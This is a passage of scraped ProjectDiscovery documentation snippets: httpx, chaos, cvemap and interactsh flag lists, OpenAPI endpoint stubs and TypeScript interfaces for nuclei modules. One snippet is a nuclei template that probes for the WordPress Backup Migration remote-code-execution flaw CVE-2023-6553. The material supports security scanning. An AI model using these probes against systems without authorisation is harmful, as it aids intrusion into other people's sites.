scaleway_access_key is the access key for scaleway API\n  scaleway_access_key: $SCALEWAY_ACCESS_KEY\n  # scaleway_access_token is the access token for scaleway API\n  scaleway_access_token: $SCALEWAY_ACCESS_TOKEN\n```\n\n----------------------------------------\n\nTITLE: Verifying Updated PATH Environment Variable\nDESCRIPTION: Command to check if the Go binary directory has been successfully added to your PATH environment variable.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/nuclei-setup.mdx#2025-04-12_snippet_7\n\nLANGUAGE: bash\nCODE:\n```\n$PATH\n```\n\n----------------------------------------\n\nTITLE: Defining PrincipalName Interface in TypeScript\nDESCRIPTION: Interface definition for PrincipalName with two optional properties: NameString as an array of strings and NameType as a number. Used for representing principal names in Kerberos authentication.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.PrincipalName.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface PrincipalName {\n    NameString?: string[];\n    NameType?: number;\n}\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI POST endpoint for template contribution\nDESCRIPTION: The code defines an OpenAPI endpoint specification for contributing templates to a repository. It specifies the endpoint path and HTTP method (POST).\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/internal/contribute-to-public-templates.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/template/contribute\n```\n\n----------------------------------------\n\nTITLE: Defining SSH EndpointId Interface in TypeScript\nDESCRIPTION: TypeScript interface defining the structure for SSH endpoint identification. Contains optional properties for protocol version, software version, comments and raw data representation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ssh.EndpointId.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface EndpointId {\n    ProtoVersion?: string;      // Defined in ssh.ts:162\n    SoftwareVersion?: string;   // Defined in ssh.ts:164\n    Comment?: string;          // Defined in ssh.ts:166\n    Raw?: string;              // Defined in ssh.ts:168\n}\n```\n\n----------------------------------------\n\nTITLE: Enabling Verbose Output in Chaos\nDESCRIPTION: Illustrates how to enable verbose output for Chaos using the -verbose flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_9\n\nLANGUAGE: bash\nCODE:\n```\nchaos -verbose\n```\n\n----------------------------------------\n\nTITLE: Downloading Subfinder Binary\nDESCRIPTION: This URL leads to the GitHub releases page where you can download the latest binary for your operating system.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/subfinder/install.mdx#2025-04-12_snippet_4\n\nLANGUAGE: bash\nCODE:\n```\nhttps://github.com/projectdiscovery/subfinder/releases\n```\n\n----------------------------------------\n\nTITLE: Implementing Base64 Encoding/Decoding in JavaScript\nDESCRIPTION: Functions for Base64 encoding and decoding of strings. 'atob' decodes a Base64 string, while 'btoa' encodes a string to Base64.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/js-helper-functions.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\natob(string) string\nbtoa(string) string\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for GET Asset Screenshot Endpoint in YAML\nDESCRIPTION: This YAML snippet defines the OpenAPI specification for the GET /v1/asset/screenshot/{asset_id} endpoint. It includes the HTTP method and the endpoint path with a path parameter for the asset ID.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/get-asset-screenshot.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/asset/screenshot/{asset_id}\n```\n\n----------------------------------------\n\nTITLE: Defining LDAP Metadata Interface in TypeScript\nDESCRIPTION: This code snippet defines the Metadata interface for LDAP server information. It includes optional properties for various LDAP-related attributes and functionality levels.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Metadata.mdx#2025-04-12_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\ninterface Metadata {\n  BaseDN?: string;\n  DefaultNamingContext?: string;\n  Domain?: string;\n  DomainFunctionality?: string;\n  ForestFunctionality?: string;\n  DomainControllerFunctionality?: string;\n  DnsHostName?: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Internal Matchers in YAML\nDESCRIPTION: Example of using internal matchers in multi-protocol templates for validation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/reference/matchers.mdx#2025-04-12_snippet_9\n\nLANGUAGE: yaml\nCODE:\n```\nid: CVE-2023-6553\n\ninfo:\n  name: Worpress Backup Migration <= 1.3.7 - Unauthenticated Remote Code Execution\n  author: FLX\n  severity: critical\n\nflow: http(1) && http(2)\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}/wp-content/plugins/backup-backup/readme.txt\"\n\n    matchers:\n      - type: dsl\n        dsl:\n          - 'status_code == 200'\n          - 'contains(body, \"Backup Migration\")'\n        condition: and\n        internal: true  # <- updated logic (this will skip printing this event/result)\n\n  - method: POST\n    path:\n      - \"{{BaseURL}}/wp-content/plugins/backup-backup/includes/backup-heart.php\"\n    headers:\n      Content-Dir: \"{{rand_text_alpha(10)}}\"\n\n    matchers:\n      - type: dsl\n        dsl:\n          - 'len(body) == 0'\n          - 'status_code == 200'\n          - '!contains(body, \"Incorrect parameters\")'\n        condition: and\n```\n\n----------------------------------------\n\nTITLE: Interactsh Server Usage Options\nDESCRIPTION: Complete list of available flags and configurations for running interactsh-server, including input, config, services, and debug options\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/interactsh/server.mdx#2025-04-12_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\nUsage:\n  ./interactsh-server [flags]\n\nFlags:\nINPUT:\n   -d, -domain string[]                     single/multiple configured domain to use for server\n   -ip string                               public ip address to use for interactsh server\n   -lip, -listen-ip string                  public ip address to listen on (default \"0.0.0.0\")\n   -e, -eviction int                        number of days to persist interaction data in memory (default 30)\n   -ne, -no-eviction                        disable periodic data eviction from memory\n   -a, -auth                                enable authentication to server using random generated token\n   -t, -token string                        enable authentication to server using given token\n   -acao-url string                         origin url to send in acao header to use web-client) (default \"*\")\n   -sa, -skip-acme                          skip acme registration (certificate checks/handshake + TLS protocols will be disabled)\n   -se, -scan-everywhere                    scan canary token everywhere\n   -cidl, -correlation-id-length int        length of the correlation id preamble (default 20)\n   -cidn, -correlation-id-nonce-length int  length of the correlation id nonce (default 13)\n   -cert string                             custom certificate path\n   -privkey string                          custom private key path\n   -oih, -origin-ip-header string           HTTP header containing origin ip (interactsh behind a reverse proxy)\n\nCONFIG:\n   -config string               flag configuration file (default \"$HOME/.config/interactsh-server/config.yaml\")\n   -dr, -dynamic-resp           enable setting up arbitrary response data\n   -cr, -custom-records string  custom dns records YAML file for DNS server\n   -hi, -http-index string      custom index file for http server\n   -hd, -http-directory string  directory with files to serve with http server\n   -ds, -disk                   disk based storage\n   -dsp, -disk-path string      disk storage path\n   -csh, -server-header string  custom value of Server header in response\n   -dv, -disable-version        disable publishing interactsh version in response header\n\nUPDATE:\n   -up, -update                 update interactsh-server to latest version\n   -duc, -disable-update-check  disable automatic interactsh-server update check\n   \nSERVICES:\n   -dns-port int           port to use for dns service (default 53)\n   -http-port int          port to use for http service (default 80)\n   -https-port int         port to use for https service (default 443)\n   -smtp-port int          port to use for smtp service (default 25)\n   -smtps-port int         port to use for smtps service (default 587)\n   -smtp-autotls-port int  port to use for smtps autotls service (default 465)\n   -ldap-port int          port to use for ldap service (default 389)\n   -ldap                   enable ldap server with full logging (authenticated)\n   -wc, -wildcard          enable wildcard interaction for interactsh domain (authenticated)\n   -smb                    start smb agent - impacket and python 3 must be installed (authenticated)\n   -responder              start responder agent - docker must be installed (authenticated)\n   -ftp                    start ftp agent (authenticated)\n   -smb-port int           port to use for smb service (default 445)\n   -ftp-port int           port to use for ftp service (default 21)\n   -ftp-dir string         ftp directory - temporary if not specified\n\nDEBUG:\n   -version            show version of the project\n   -debug              start interactsh server in debug mode\n   -ep, -enable-pprof  enable pprof debugging server\n   -health-check, -hc  run diagnostic check up\n   -metrics            enable metrics endpoint\n   -v, -verbose        display verbose interaction\n```\n\n----------------------------------------\n\nTITLE: Installing TunnelX from Source in Bash\nDESCRIPTION: Instructions for cloning the TunnelX repository and running it from source. This method provides more control over the installation process for cloud-managed internal scanning.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/scanning/internal-scan.mdx#2025-04-12_snippet_3\n\nLANGUAGE: bash\nCODE:\n```\n# Clone and run from source\ngit clone https://github.com/projectdiscovery/tunnelx.git\ncd tunnelx\nexport PDCP_API_KEY=\"your_api_key\"\ngo run .\n```\n\n----------------------------------------\n\nTITLE: OpenAPI GET Asset Endpoint Definition\nDESCRIPTION: OpenAPI/Swagger specification defining the GET endpoint for retrieving an asset by its ID. The path includes a dynamic asset_Id parameter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/assets/get-asset-metadata.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/assets/{asset_Id}\n```\n\n----------------------------------------\n\nTITLE: Installing httpx using Docker\nDESCRIPTION: Pulls the latest httpx Docker image from ProjectDiscovery's repository.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/install.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\ndocker pull projectdiscovery/httpx:latest\n```\n\n----------------------------------------\n\nTITLE: Setting API Key via Environment Variable in PDCP\nDESCRIPTION: Sets the PDCP API key using an environment variable, avoiding the need to enter it through the command line. The configured API key is stored in $HOME/.pdcp/credentials.yaml.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/cloud/free/advanced.mdx#2025-04-12_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nexport PDCP_API_KEY=XXXX-XXXX\n```\n\n----------------------------------------\n\nTITLE: Defining TransitedEncoding Interface for Kerberos in TypeScript\nDESCRIPTION: This code snippet defines the TransitedEncoding interface with two optional properties: Contents of type Uint8Array and TRType of type number. These properties are defined in the kerberos.ts file.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/kerberos.TransitedEncoding.mdx#2025-04-12_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\ninterface TransitedEncoding {\n  Contents?: Uint8Array;\n  TRType?: number;\n}\n```\n\n----------------------------------------\n\nTITLE: Delete Asset Enumeration OpenAPI Endpoint Definition\nDESCRIPTION: OpenAPI specification for the DELETE endpoint that removes an asset enumeration record based on the provided enumerate_id parameter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/enumerations/delete-enumeration.mdx#2025-04-12_snippet_0\n\nLANGUAGE: openapi\nCODE:\n```\nopenapi: delete /v1/asset/enumerate/{enumerate_id}\n```\n\n----------------------------------------\n\nTITLE: Processing Multiple Domains with Chaos\nDESCRIPTION: Shows how to use Chaos with a file containing a list of domains using the -dL flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nchaos -dL domains.txt\n```\n\n----------------------------------------\n\nTITLE: Defining SMBVersions Interface Properties in TypeScript\nDESCRIPTION: This snippet defines the properties of the SMBVersions interface. It includes optional properties for Major, Minor, and Revision numbers, as well as a VerString for version information.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.SMBVersions.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface SMBVersions {\n  Major?: number;\n  Minor?: number;\n  Revision?: number;\n  VerString?: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Checking Chaos Version\nDESCRIPTION: Shows how to print the current version of the Chaos client using the -version flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_8\n\nLANGUAGE: bash\nCODE:\n```\nchaos -version\n```\n\n----------------------------------------\n\nTITLE: OpenAPI Endpoint Definition - Vulnerability Retest\nDESCRIPTION: OpenAPI specification for the POST endpoint that triggers a retest of a specific vulnerability identified by vuln_id parameter.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/retest-vulnerability.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/scans/{vuln_id}/retest\n```\n\n----------------------------------------\n\nTITLE: Defining MySQLInfo Interface in TypeScript\nDESCRIPTION: This code snippet defines the MySQLInfo interface with various optional properties representing different aspects of a MySQL server connection and configuration.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.MySQLInfo.mdx#2025-04-12_snippet_0\n\nLANGUAGE: TypeScript\nCODE:\n```\ninterface MySQLInfo {\n  Debug?: ServiceMySQL;\n  Host?: string;\n  IP?: string;\n  Port?: number;\n  Protocol?: string;\n  Raw?: string;\n  TLS?: boolean;\n  Transport?: string;\n  Version?: string;\n}\n```\n\n----------------------------------------\n\nTITLE: Using IsSMTP Function with SMTP Module\nDESCRIPTION: Example demonstrating how to use the SMTP module to check if a server is running SMTP on a specific port. The code imports the SMTP module, performs a check on 'acme.com' port 25, and logs the JSON response.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.IsSMTPResponse.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst isSMTP = smtp.IsSMTP('acme.com', 25);\nlog(toJSON(isSMTP));\n```\n\n----------------------------------------\n\nTITLE: Displaying Httpx Command-Line Options in Markdown\nDESCRIPTION: This code block presents a comprehensive list of command-line options for the httpx tool, organized into categories. It includes options for input, probes, matchers, filters, rate limiting, output, and various other configurations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/usage.mdx#2025-04-12_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n```\nFlags:\nINPUT:\n   -l, -list string      input file containing list of hosts to process\n   -rr, -request string  file containing raw request\n   -u, -target string[]  input target host(s) to probe\n\nPROBES:\n   -sc, -status-code     display response status-code\n   -cl, -content-length  display response content-length\n   -ct, -content-type    display response content-type\n   -location             display response redirect location\n   -favicon              display mmh3 hash for '/favicon.ico' file\n   -hash string          display response body hash (supported: md5,mmh3,simhash,sha1,sha256,sha512)\n   -jarm                 display jarm fingerprint hash\n   -rt, -response-time   display response time\n   -lc, -line-count      display response body line count\n   -wc, -word-count      display response body word count\n   -title                display page title\n   -bp, -body-preview    display first N characters of response body (default 100)\n   -server, -web-server  display server name\n   -td, -tech-detect     display technology in use based on wappalyzer dataset\n   -method               display http request method\n   -websocket            display server using websocket\n   -ip                   display host ip\n   -cname                display host cname\n   -asn                  display host asn information\n   -cdn                  display cdn/waf in use\n   -probe                display probe status\n\nHEADLESS:\n   -ss, -screenshot                 enable saving screenshot of the page using headless browser\n   -system-chrome                   enable using local installed chrome for screenshot\n   -esb, -exclude-screenshot-bytes  enable excluding screenshot bytes from json output\n   -ehb, -exclude-headless-body     enable excluding headless header from json output\n\nMATCHERS:\n   -mc, -match-code string            match response with specified status code (-mc 200,302)\n   -ml, -match-length string          match response with specified content length (-ml 100,102)\n   -mlc, -match-line-count string     match response body with specified line count (-mlc 423,532)\n   -mwc, -match-word-count string     match response body with specified word count (-mwc 43,55)\n   -mfc, -match-favicon string[]      match response with specified favicon hash (-mfc 1494302000)\n   -ms, -match-string string          match response with specified string (-ms admin)\n   -mr, -match-regex string           match response with specified regex (-mr admin)\n   -mcdn, -match-cdn string[]         match host with specified cdn provider (cloudfront, fastly, google, leaseweb, stackpath)\n   -mrt, -match-response-time string  match response with specified response time in seconds (-mrt '< 1')\n   -mdc, -match-condition string      match response with dsl expression condition\n\nEXTRACTOR:\n   -er, -extract-regex string[]   display response content with matched regex\n   -ep, -extract-preset string[]  display response content matched by a pre-defined regex (ipv4,mail,url)\n\nFILTERS:\n   -fc, -filter-code string            filter response with specified status code (-fc 403,401)\n   -fep, -filter-error-page            filter response with ML based error page detection\n   -fd, -filter-duplicates             filter out near-duplicate responses (only first response is retained)\n   -fl, -filter-length string          filter response with specified content length (-fl 23,33)\n   -flc, -filter-line-count string     filter response body with specified line count (-flc 423,532)\n   -fwc, -filter-word-count string     filter response body with specified word count (-fwc 423,532)\n   -ffc, -filter-favicon string[]      filter response with specified favicon hash (-ffc 1494302000)\n   -fs, -filter-string string          filter response with specified string (-fs admin)\n   -fe, -filter-regex string           filter response with specified regex (-fe admin)\n   -fcdn, -filter-cdn string[]         filter host with specified cdn provider (cloudfront, fastly, google, leaseweb, stackpath)\n   -frt, -filter-response-time string  filter response with specified response time in seconds (-frt '> 1')\n   -fdc, -filter-condition string      filter response with dsl expression condition\n   -strip                              strips all tags in response. supported formats: html,xml (default html)\n\nRATE-LIMIT:\n   -t, -threads int              number of threads to use (default 50)\n   -rl, -rate-limit int          maximum requests to send per second (default 150)\n   -rlm, -rate-limit-minute int  maximum number of requests to send per minute\n\nMISCELLANEOUS:\n   -pa, -probe-all-ips        probe all the ips associated with same host\n   -p, -ports string[]        ports to probe (nmap syntax: eg http:1,2-10,11,https:80)\n   -path string               path or list of paths to probe (comma-separated, file)\n   -tls-probe                 send http probes on the extracted TLS domains (dns_name)\n   -csp-probe                 send http probes on the extracted CSP domains\n   -tls-grab                  perform TLS(SSL) data grabbing\n   -pipeline                  probe and display server supporting HTTP1.1 pipeline\n   -http2                     probe and display server supporting HTTP2\n   -vhost                     probe and display server supporting VHOST\n   -ldv, -list-dsl-variables  list json output field keys name that support dsl matcher/filter\n\nUPDATE:\n   -up, -update                 update httpx to latest version\n   -duc, -disable-update-check  disable automatic httpx update check\n\nOUTPUT:\n   -o, -output string                  file to write output results\n   -oa, -output-all                    filename to write output results in all formats\n   -sr, -store-response                store http response to output directory\n   -srd, -store-response-dir string    store http response to custom directory\n   -csv                                store output in csv format\n   -csvo, -csv-output-encoding string  define output encoding\n   -j, -json                           store output in JSONL(ines) format\n   -irh, -include-response-header      include http response (headers) in JSON output (-json only)\n   -irr, -include-response             include http request/response (headers + body) in JSON output (-json only)\n   -irrb, -include-response-base64     include base64 encoded http request/response in JSON output (-json only)\n   -include-chain                      include redirect http chain in JSON output (-json only)\n   -store-chain                        include http redirect chain in responses (-sr only)\n   -svrc, -store-vision-recon-cluster  include visual recon clusters (-ss and -sr only)\n\nCONFIGURATIONS:\n   -config string                path to the httpx configuration file (default $HOME/.config/httpx/config.yaml)\n   -r, -resolvers string[]       list of custom resolver (file or comma separated)\n   -allow string[]               allowed list of IP/CIDR's to process (file or comma separated)\n   -deny string[]                denied list of IP/CIDR's to process (file or comma separated)\n   -sni, -sni-name string        custom TLS SNI name\n   -random-agent                 enable Random User-Agent to use (default true)\n   -H, -header string[]          custom http headers to send with request\n   -http-proxy, -proxy string    http proxy to use (eg http://127.0.0.1:8080)\n   -unsafe                       send raw requests skipping golang normalization\n   -resume                       resume scan using resume.cfg\n   -fr, -follow-redirects        follow http redirects\n   -maxr, -max-redirects int     max number of redirects to follow per host (default 10)\n   -fhr, -follow-host-redirects  follow redirects on the same host\n   -rhsts, -respect-hsts         respect HSTS response headers for redirect requests\n   -vhost-input                  get a list of vhosts as input\n   -x string                     request methods to probe, use 'all' to probe all HTTP methods\n   -body string                  post body to include in http request\n   -s, -stream                   stream mode - start elaborating input targets without sorting\n   -sd, -skip-dedupe             disable dedupe input items (only used with stream mode)\n   -ldp, -leave-default-ports    leave default http/https ports in host header (eg. http://host:80 - https://host:443\n   -ztls                         use ztls library with autofallback to standard one for tls13\n   -no-decode                    avoid decoding body\n   -tlsi, -tls-impersonate       enable experimental client hello (ja3) tls randomization\n   -no-stdin                     Disable Stdin processing\n\nDEBUG:\n   -health-check, -hc        run diagnostic check up\n   -debug                    display request/response content in cli\n   -debug-req                display request content in cli\n   -debug-resp               display response content in cli\n   -version                  display httpx version\n   -stats                    display scan statistic\n   -profile-mem string       optional httpx memory profile dump file\n   -silent                   silent mode\n   -v, -verbose              verbose mode\n   -si, -stats-interval int  number of seconds to wait between showing a statistics update (default: 5)\n   -nc, -no-color            disable colors in cli output\n\nOPTIMIZATIONS:\n   -nf, -no-fallback                  display both probed protocol (HTTPS and HTTP)\n   -nfs, -no-fallback-scheme          probe with protocol scheme specified in input \n   -maxhr, -max-host-error int        max error count per host before skipping remaining path/s (default 30)\n   -ec, -exclude-cdn                  skip full port scans for CDN/WAF (only checks for 80,443)\n   -retries int                       number of retries\n   -timeout int                       timeout in seconds (default 10)\n   -delay value                       duration between each http request (eg: 200ms, 1s) (default -1ns)\n   -rsts, -response-size-to-save int  max response size to save in bytes (default 2147483647)\n```\n```\n\n----------------------------------------\n\nTITLE: Displaying Httpx Help Options in Bash\nDESCRIPTION: This command shows how to access the full list of help options for the httpx tool using the command line. It uses the '-h' flag to display the help menu.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nhttpx - h\n```\n\n----------------------------------------\n\nTITLE: Output Formatting in Katana\nDESCRIPTION: Examples of different output formats including plain text and JSON output with additional metadata.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/katana/running.mdx#2025-04-12_snippet_29\n\nLANGUAGE: shell\nCODE:\n```\nkatana -u https://example.com -no-scope -output example_endpoints.txt\n```\n\nLANGUAGE: shell\nCODE:\n```\nkatana -u https://example.com -jsonl | jq .\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Endpoint for API Key Retrieval\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for a GET endpoint to retrieve a user's API key. It specifies the endpoint path as '/v1/user/apikey'.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/users/get-api-key.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/user/apikey\n```\n\n----------------------------------------\n\nTITLE: Declaring Attributes Property for LDAP Entry in TypeScript\nDESCRIPTION: This snippet declares the optional Attributes property of the Entry interface. It is of type EntryAttribute and is defined in the ldap.ts file at line 544.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/ldap.Entry.mdx#2025-04-12_snippet_1\n\nLANGUAGE: typescript\nCODE:\n```\nAttributes?: EntryAttribute;\n```\n\n----------------------------------------\n\nTITLE: Sending Bulk Notifications from File in Notify\nDESCRIPTION: Illustrates bulk notification sending from a saved output file\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/notify/running.mdx#2025-04-12_snippet_2\n\nLANGUAGE: sh\nCODE:\n```\nsubfinder -d hackerone.com -o h1.txt; notify -data h1.txt -bulk\n```\n\n----------------------------------------\n\nTITLE: OpenAPI PATCH Endpoint Definition for Vulnerability Scans\nDESCRIPTION: OpenAPI specification snippet defining a PATCH operation for the /v1/scans/vulns endpoint. This appears to be part of vulnerability scanning API documentation.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/scans/update-vulnerability-status.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: patch /v1/scans/vulns\n```\n\n----------------------------------------\n\nTITLE: Defining OpenAPI Specification for User Feedback Endpoint in YAML\nDESCRIPTION: This YAML snippet specifies the OpenAPI definition for a POST endpoint to handle user feedback submissions. It includes the HTTP method (POST) and the endpoint path (/v1/user/feedback).\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/users/create-feedback.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: post /v1/user/feedback\n```\n\n----------------------------------------\n\nTITLE: Installing Development Version of libnss3 on Ubuntu\nDESCRIPTION: This command installs the development version of libnss3 on Ubuntu. It's a solution for when the error 'libnss3.so: cannot open shared object file: No such file or directory' is encountered.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/faq.mdx#2025-04-12_snippet_3\n\nLANGUAGE: sh\nCODE:\n```\nsudo apt-get install libnss3-dev\n```\n\n----------------------------------------\n\nTITLE: Installing Chromium Browser on Ubuntu with Snap\nDESCRIPTION: This command installs the Chromium browser on Ubuntu using the Snap package manager. It's a simple one-line solution for systems that support Snap.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/nuclei/faq.mdx#2025-04-12_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\nsudo snap install chromium\n```\n\n----------------------------------------\n\nTITLE: Disabling Automatic Update Check in Chaos\nDESCRIPTION: Shows how to disable the automatic update check for Chaos using the -disable-update-check flag.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/chaos/usage.mdx#2025-04-12_snippet_11\n\nLANGUAGE: bash\nCODE:\n```\nchaos -duc\n```\n\n----------------------------------------\n\nTITLE: Defining GET /v1/user/usage OpenAPI Endpoint\nDESCRIPTION: This YAML snippet defines an OpenAPI specification for the GET /v1/user/usage endpoint. The endpoint appears to retrieve usage information for a user.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/usage/get-api-services-usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/user/usage\n```\n\n----------------------------------------\n\nTITLE: Defining ServiceMySQL Interface in TypeScript\nDESCRIPTION: TypeScript interface definition for ServiceMySQL containing optional properties for PacketType, ErrorMessage, and ErrorCode used in MySQL service operations.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/mysql.ServiceMySQL.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface ServiceMySQL {\n    PacketType?: string;    // Defined in mysql.ts:224\n    ErrorMessage?: string;   // Defined in mysql.ts:226\n    ErrorCode?: number;     // Defined in mysql.ts:228\n}\n```\n\n----------------------------------------\n\nTITLE: Initializing SMTPClient in JavaScript\nDESCRIPTION: Basic example of importing and instantiating an SMTPClient object.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smtp.SMTPClient.mdx#2025-04-12_snippet_0\n\nLANGUAGE: javascript\nCODE:\n```\nconst smtp = require('nuclei/smtp');\nconst client = new smtp.Client();\n```\n\n----------------------------------------\n\nTITLE: HTTPX Response Size Limitation Flag\nDESCRIPTION: Command line flag to specify the maximum response size to read in bytes. The default value is 2147483647 (approximately 2GB).\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/httpx/usage.mdx#2025-04-12_snippet_2\n\nLANGUAGE: bash\nCODE:\n```\n-rstr, -response-size-to-read int  max response size to read in bytes (default 2147483647)\n```\n\n----------------------------------------\n\nTITLE: Displaying cvemap Help Options in Bash\nDESCRIPTION: This snippet shows the full list of command-line options available for the cvemap tool. It includes configuration options, filtering parameters, output customization, and debug flags.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/tools/cvemap/usage.mdx#2025-04-12_snippet_0\n\nLANGUAGE: bash\nCODE:\n```\nFlags:\nCONFIG:\n   -auth  configure projectdiscovery cloud (pdcp) api key\n\nOPTIONS:\n   -id string[]                    cve to list for given id\n   -v, -vendor string[]            cve to list for given vendor\n   -p, -product string[]           cve to list for given product\n   -eproduct string[]              cves to exclude based on products\n   -s, -severity string[]          cve to list for given severity\n   -cs, -cvss-score string[]       cve to list for given cvss score\n   -c, -cpe string                 cve to list for given cpe\n   -es, -epss-score string         cve to list for given epss score\n   -ep, -epss-percentile string[]  cve to list for given epss percentile\n   -age string                     cve to list published by given age in days\n   -a, -assignee string[]          cve to list for given publisher assignee\n   -vs, -vstatus value             cve to list for given vulnerability status in cli output. supported: modified, rejected, unknown, new, confirmed, unconfirmed\n\nUPDATE:\n   -up, -update                 update cvemap to latest version\n   -duc, -disable-update-check  disable automatic cvemap update check\n\nFILTER:\n   -q, -search string  search in cve data\n   -k, -kev            display cves marked as exploitable vulnerabilities by cisa (default true)\n   -t, -template       display cves that has public nuclei templates (default true)\n   -poc                display cves that has public published poc (default true)\n   -h1, -hackerone     display cves reported on hackerone (default true)\n   -re, -remote        display remotely exploitable cves (AV:N & PR:N | PR:L) (default true)\n\nOUTPUT:\n   -f, -field value         fields to display in cli output. supported: age, kev, template, poc, cwe, vendor, vstatus, epss, product, assignee\n   -fe, -exclude value      fields to exclude from cli output. supported: age, kev, template, poc, cwe, vendor, vstatus, epss, product, assignee\n   -lsi, -list-id           list only the cve ids in the output\n   -l, -limit int           limit the number of results to display (default 50)\n   -offset int              offset the results to display\n   -j, -json                return output in json format\n   -epk, -enable-page-keys  enable page keys to navigate results\n\nDEBUG:\n   -version  Version\n   -silent   Silent\n   -verbose  Verbose\n```\n\n----------------------------------------\n\nTITLE: Defining GET Endpoint for Template Retrieval in OpenAPI\nDESCRIPTION: This snippet defines an OpenAPI endpoint specification for retrieving template information using a template ID. It specifies that the endpoint uses the GET HTTP method and requires a path parameter called 'template_id'.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/api-reference/templates/get-template.mdx#2025-04-12_snippet_0\n\nLANGUAGE: yaml\nCODE:\n```\nopenapi: get /v1/template/{template_id}\n```\n\n----------------------------------------\n\nTITLE: Defining SMBLog Interface Properties in TypeScript\nDESCRIPTION: This snippet defines the properties of the SMBLog interface, including optional fields for SMB capabilities, version information, NTLM authentication, and negotiation logs.\nSOURCE: https://github.com/projectdiscovery/docs/blob/main/templates/protocols/javascript/modules/smb.SMBLog.mdx#2025-04-12_snippet_0\n\nLANGUAGE: typescript\nCODE:\n```\ninterface SMBLog {\n  Capabilities?: SMBCapabilities;\n  GroupName?: string;\n  HasNTLM?: boolean;\n  NTLM?: string;\n  NativeOs?: string;\n  NegotiationLog?: NegotiationLog;\n  SessionSetupLog?: SessionSetupLog;\n  